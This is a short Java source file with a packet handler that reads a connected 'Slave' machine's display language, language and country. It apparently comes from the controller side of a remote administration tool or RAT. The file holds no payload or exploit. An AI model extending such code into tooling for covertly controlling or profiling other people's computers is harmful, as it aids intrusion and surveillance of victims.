package com.redpois0n.packets;

import com.redpois0n.Slave;

public class PacketLOCALE extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		slave.setDisplayLanguage(slave.readLine());
		slave.setLanguage(slave.readLine());
		slave.setLongCountry(slave.readLine());

	}

}
